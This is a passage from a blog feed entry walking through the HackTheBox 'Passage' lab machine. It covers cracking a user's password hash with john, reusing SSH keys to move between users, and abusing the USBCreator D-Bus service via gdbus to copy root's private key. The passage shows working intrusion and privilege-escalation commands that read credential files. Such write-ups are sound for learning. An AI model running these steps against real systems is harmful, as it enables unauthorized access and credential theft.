a:1:&#123;s:5:&quot;email&quot;;a:1:&#123;s:16:&quot;paul@passage.htb&quot;;s:10:&quot;paul-coles&quot;;&#125;&#125;</code></pre><p>so i decided to decode all the files i know the base64 is mostly start with “Y” so used the command</p><pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ grep -rh Y | base64 -d</code></pre><p>i got the paul user hash let crack the hash with john</p><blockquote><p>user@home:~$ echo ‘e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd’ &gt; hash john hash –wordlist&#x3D;&#x2F;opt&#x2F;rockyou.txt –format&#x3D;Raw-SHA256</p></blockquote><pre><code>#john hash --wordlist=/opt/rockyou.txt --format=Raw-SHA256Using default input encoding: UTF-8Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])Warning: poor OpenMP scalability for this hash type, consider --fork=2Will run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusatlanXXX         (?)1g 0:00:00:00 DONE (2021-03-18 18:52) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocolisoUse the &quot;--show --format=Raw-SHA256&quot; options to display all of the cracked passwords reliablySession completed</code></pre><p>change the user to paul</p><blockquote><p>python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”<br>su paul</p></blockquote><pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;&lt;tml/CuteNews/cdata/users$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;    www-data@passage:/var/www/html/CuteNews/cdata/users$ su paulsu paulPassword: paul@passage:/var/www/html/CuteNews/cdata/users$ </code></pre><p>Found the user flag at &#x2F;home&#x2F;paul&#x2F;user.txt</p><pre><code>paul@passage:~$ pwdpwd/home/paulpaul@passage:~$ wc user.txtwc user.txt 1  1 33 user.txt</code></pre><h1 id="Privilage-Escalation"><a href="#Privilage-Escalation" class="headerlink" title="Privilage Escalation"></a><strong>Privilage Escalation</strong></h1><p>after some enumuration i found the interesting only one entry in the auhorization_keys</p><pre><code>paul@passage:~/.ssh$ cat authorized_keyscat authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage</code></pre><h2 id="Getting-User-nadav"><a href="#Getting-User-nadav" class="headerlink" title="Getting User nadav"></a><strong>Getting User nadav</strong></h2><p>then i assume there is a possible that the user paul and nadav have shared SSH keys. so i copied the id_rsa file from the paul.</p><blockquote><p>user@home:~$ chmod 600 nadav.key user@home:~$ ssh -i nadav.key <a href="mailto:&#x6e;&#x61;&#100;&#97;&#x76;&#64;&#x70;&#x61;&#x73;&#115;&#97;&#103;&#x65;&#x2e;&#x68;&#116;&#x62;">&#x6e;&#x61;&#100;&#97;&#x76;&#64;&#x70;&#x61;&#x73;&#115;&#97;&#103;&#x65;&#x2e;&#x68;&#116;&#x62;</a> <strong>It worked</strong> I got the user nadav</p></blockquote><pre><code>chmod 600 nadav.keyssh -i nadav.key nadav@passage.htbLast login: Mon Aug 31 15:07:54 2020 from 127.0.0.1nadav@passage:~$ iduid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)nadav@passage:~$ </code></pre><h1 id="Getting-Root"><a href="#Getting-Root" class="headerlink" title="Getting Root"></a><strong>Getting Root</strong></h1><p>After some enumuration i found the some interesting information from <strong>.vim</strong> file The vim history indicates that there have been some changes in the files &#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;com.ubuntu.USBCreator.conf and &#x2F;etc&#x2F;polkit-1&#x2F;localauthority.conf.d&#x2F;51-ubuntu-admin.conf.</p><blockquote><p>nadav@passage:~$ cat  &#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;com.ubuntu.USBCreator.conf</p></blockquote><pre><code>nadav@passage:~$ cat  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf&lt;!DOCTYPE busconfig PUBLIC &quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot; &quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;&gt;&lt;busconfig&gt;  &lt;!-- Only root can own the service --&gt;  &lt;policy user=&quot;root&quot;&gt;    &lt;allow own=&quot;com.ubuntu.USBCreator&quot;/&gt;  &lt;/policy&gt;  &lt;!-- Allow anyone to invoke methods (further constrained by       PolicyKit privileges --&gt;  &lt;policy context=&quot;default&quot;&gt;    &lt;allow send_destination=&quot;com.ubuntu.USBCreator&quot;            send_interface=&quot;com.ubuntu.USBCreator&quot;/&gt;    &lt;allow send_destination=&quot;com.ubuntu.USBCreator&quot;            send_interface=&quot;org.freedesktop.DBus.Introspectable&quot;/&gt;    &lt;allow send_destination=&quot;com.ubuntu.USBCreator&quot;            send_interface=&quot;org.freedesktop.DBus.Properties&quot;/&gt;  &lt;/policy&gt;&lt;/busconfig&gt;</code></pre><blockquote><p>nadav@passage:~$ cat &#x2F;etc&#x2F;polkit-1&#x2F;localauthority.conf.d&#x2F;51-ubuntu-admin.conf</p></blockquote><pre><code>nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf[Configuration]AdminIdentities=unix-group:sudo;unix-group:adminnadav@passage:~$ </code></pre><p>so i copy the file name and google it. what i understand is the user with sudo group can do the privilage escalation and the user nadav is the sudo group user so i try that command. after that i used the command to get the ssh key of the root user and copied to the &#x2F;home&#x2F;nadav&#x2F;key</p><blockquote><p>gdbus call –system –dest com.ubuntu.USBCreator –object-path &#x2F;com&#x2F;ubuntu&#x2F;USBCreator –method com.ubuntu.USBCreator.Image &#x2F;root&#x2F;.ssh&#x2F;id_rsa &#x2F;home&#x2F;nadav&#x2F;key true</p></blockquote><pre><code>nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/key true()</code></pre><p>copy the key file to my machine and saved it with name root.key then give the permission</p><blockquote><p>user@home:~$ chmod 600 root.key so let login to the root user…. BOOM</p></blockquote><blockquote><p>user@home:~$ ssh -i root.key <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#x70;&#97;&#x73;&#x73;&#97;&#103;&#x65;&#x2e;&#x68;&#116;&#98;">&#114;&#x6f;&#111;&#x74;&#64;&#x70;&#97;&#x73;&#x73;&#97;&#103;&#x65;&#x2e;&#x68;&#116;&#98;</a></p></blockquote><pre><code>#ssh -i root.key root@passage.htbLast login: Mon Aug 31 15:14:22 2020 from 127.0.0.1root@passage:~# iduid=0(root) gid=0(root) groups=0(root)root@passage:~# wc root.txt 1  1 33 root.txtroot@passage:~# </code></pre><p><strong><center>#rooted</center></strong></p>]]></content>
    
    
    <summary type="html">Passage is the medium level hackthebox machine which is running in the linux.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="htb" scheme="https://mdn1nj4.github.io/tags/htb/"/>
    
  </entry>
  
</feed>
